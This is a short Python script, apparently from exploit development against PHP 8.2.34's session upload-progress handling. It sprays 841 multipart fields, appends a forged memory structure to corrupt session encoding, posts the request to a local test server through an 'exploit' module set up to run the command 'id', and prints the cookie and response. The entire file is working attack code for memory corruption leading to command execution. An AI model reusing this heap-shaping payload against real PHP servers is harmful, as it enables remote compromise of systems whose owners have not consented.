#!/usr/bin/env python3
"""Send reqB (with forge) to 8.2.34 to trigger the php_session_encode breakpoint."""
import sys, time, struct
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart
t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)
ex = Exploit(t, "id", profile="bookworm")
parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
         {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
for i in range(841):
    parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18]=ord("L")
parts.append({"name":"1999","data":bytes(forge)})
r = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
body = r.partition(b"\r\n\r\n")[2]
import re
ck = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?);", r)
print("cookie len:", len(ck.group(1)) if ck else 0)
print("body:", body[:100])
